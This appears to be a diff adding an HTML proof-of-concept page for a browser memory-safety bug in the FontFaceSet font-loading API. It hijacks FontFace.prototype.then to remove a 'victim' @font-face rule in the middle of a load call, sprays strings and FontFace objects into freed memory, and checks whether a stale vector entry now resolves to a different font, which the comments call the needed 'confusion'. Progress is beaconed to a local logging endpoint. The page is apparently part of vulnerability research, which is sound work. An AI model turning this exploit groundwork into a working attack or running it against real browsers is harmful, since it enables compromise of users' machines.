@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>FontFaceSet stale-vector swap (14.10)</title></head>
+<body>
+<textarea id="log" readonly style="width:100%;height:340px"></textarea>
+<script>
+// Finding 12 follow-up: after the recalc clears and rebuilds the CSS-connected
+// face set, the stale vector entry that used to name the victim may be occupied
+// by a face belonging to a different rule. If so, the resolved array reports the
+// filler family where the victim was, which is the confusion we need.
+(function(){
+  var logEl = document.getElementById('log');
+  var cfg = { filler: 8, del: 0, rm: 1, layout: 1, text: 'AB', font: '1em a, x', jsig: 0, reload: 0, strlo: 0, strhi: 0, strstep: 16, strper: 4 };
+  try {
+    var xc = new XMLHttpRequest();
+    xc.open('GET', '/corpus/ffset-config.json?t=' + Date.now(), false);
+    xc.send();
+    var c = JSON.parse(xc.responseText);
+    if (c.filler !== undefined) cfg.filler = c.filler | 0;
+    if (c.del !== undefined) cfg.del = c.del ? 1 : 0;
+    if (c.rm !== undefined) cfg.rm = c.rm ? 1 : 0;
+    if (c.layout !== undefined) cfg.layout = c.layout ? 1 : 0;
+    if (c.text !== undefined) cfg.text = String(c.text);
+    if (c.font !== undefined) cfg.font = String(c.font);
+    if (c.jsig !== undefined) cfg.jsig = c.jsig | 0;
+    if (c.reload !== undefined) cfg.reload = c.reload ? 1 : 0;
+    if (c.strlo !== undefined) cfg.strlo = c.strlo | 0;
+    if (c.strhi !== undefined) cfg.strhi = c.strhi | 0;
+    if (c.strstep !== undefined) cfg.strstep = c.strstep | 0;
+    if (c.strper !== undefined) cfg.strper = c.strper | 0;
+  } catch (e) {}
+
+  function syncLog(tag, msg) {
+    var line = 'SWAP filler=' + cfg.filler + ' del=' + cfg.del + ' rm=' + cfg.rm +
+               ' lay=' + cfg.layout + ' text=' + cfg.text + ' font=' + cfg.font + ' jsig=' + cfg.jsig + ' strs=' + cfg.strlo + '-' + cfg.strhi + '/' + cfg.strstep + 'x' + cfg.strper + ' ' + tag + ' ' + msg;
+    logEl.value += line + '\n';
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/beacon/' + tag, false);
+      x.send(line);
+    } catch (e) {}
+  }
+
+  var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  syncLog('ADD', 'FontFace a added');
+
+  // fillers: one rule each, distinct families, all CSS-connected
+  var fillers = [];
+  for (var i = 0; i < cfg.filler; i++) {
+    var fam = 'm' + i;
+    var st = document.createElement('style');
+    st.id = 'filler-' + i;
+    st.textContent = '@font-face { font-family: ' + fam + '; src: local(Arial); unicode-range: U+0043; }';
+    document.head.appendChild(st);
+    fillers.push(fam);
+  }
+
+  var victim = document.createElement('style');
+  victim.id = 'victim-style';
+  victim.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
+  document.head.appendChild(victim);
+  syncLog('VICTIM', 'injected, fillers=' + fillers.length);
+
+  var fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired) return undefined;
+      fired = true;
+      syncLog('GETTER', 'enter');
+      if (cfg.rm) {
+        try { victim.remove(); syncLog('GETTER', 'victim-removed'); }
+        catch (e) { syncLog('GETTER', 'rm-err ' + e); }
+      }
+      if (cfg.layout) {
+        try { void document.body.offsetHeight; syncLog('GETTER', 'layout'); } catch (e) {}
+      }
+      if (cfg.del) {
+        try { document.fonts.delete(this); syncLog('GETTER', 'delete'); } catch (e) {}
+      }
+      if (cfg.strhi >= cfg.strlo && cfg.strstep > 0) {
+        var hs = window.__strs || (window.__strs = []);
+        var made = 0;
+        for (var n = cfg.strlo; n <= cfg.strhi; n += cfg.strstep) {
+          var s = new Array(n + 1).join('A');
+          for (var j = 0; j < cfg.strper; j++) { hs.push(s + ''); made++; }
+        }
+        syncLog('GETTER', 'strs ' + cfg.strlo + '-' + cfg.strhi + '/' + cfg.strstep + ' n=' + made);
+      }
+      if (cfg.jsig > 0) {
+        var hold = window.__hold || (window.__hold = []);
+        var made = 0;
+        for (var i = 0; i < cfg.jsig; i++) {
+          try { hold.push(new FontFace('z' + i, 'local(Arial)')); made++; } catch (e) { break; }
+        }
+        syncLog('GETTER', 'jsfaces z' + made);
+      }
+      syncLog('GETTER', 'returning');
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  syncLog('CALL', 'load ' + cfg.font);
+  document.fonts.load(cfg.font, cfg.text).then(
+    function(list) {
+      var fams = [];
+      for (var i = 0; i < list.length; i++) {
+        try { fams.push(list[i].family); } catch (e) { fams.push('?'); }
+      }
+      syncLog('RESOLVED', 'size=' + list.length + ' fams=[' + fams.join(',') + ']');
+    },
+    function(e) { syncLog('REJECTED', String(e)); }
+  );
+  syncLog('PROMISE', 'returned');
+
+  setTimeout(function() {
+    var fams2 = [];
+    document.fonts.forEach(function(f) { fams2.push(f.family); });
+    syncLog('ALIVE', 'fonts.size=' + document.fonts.size + ' set=[' + fams2.join(',') + ']');
+    if (cfg.reload) setTimeout(function() { location.reload(); }, 250);
+  }, 900);
+})();
+</script>
+</body></html>
